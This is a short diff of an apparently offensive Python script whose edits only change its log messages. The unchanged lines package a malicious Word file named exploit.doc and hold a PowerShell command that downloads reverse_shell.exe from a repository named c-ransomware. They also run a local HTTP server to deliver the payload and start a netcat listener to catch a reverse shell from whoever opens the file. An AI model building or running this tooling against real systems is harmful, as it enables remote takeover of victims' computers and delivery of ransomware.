@@ -25,7 +25,7 @@ with open(os.path.join(staging, "doc", "word", "_rels", "document.xml.rels"), "w
 # build maldoc
 shutil.make_archive("exploit.doc", "zip", os.path.join(staging, "doc"))
 os.rename("exploit.doc.zip", "exploit.doc")
-print(f"[+] Created: exploit.doc")
+print(f"Created maldoc")
 
 cmd = (
     "Invoke-WebRequest https://raw.githubusercontent.com/HoangTPMAFK/c-ransomware/main/victim/reverse_shell.exe "
@@ -48,8 +48,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         super().__init__(*args, directory=os.path.join(staging, "www"), **kwargs)
 
 srv = socketserver.TCPServer(("", PORT), Handler)
-print(f"[+] HTTP server on :{PORT}")
-print(f"[+] Waiting for victim to open exploit.doc...")
+print(f"[+] HTTP server :{PORT}")
 threading.Thread(target=srv.serve_forever, daemon=True).start()
 
 os.system(f"nc -lvnp {REV_PORT}")
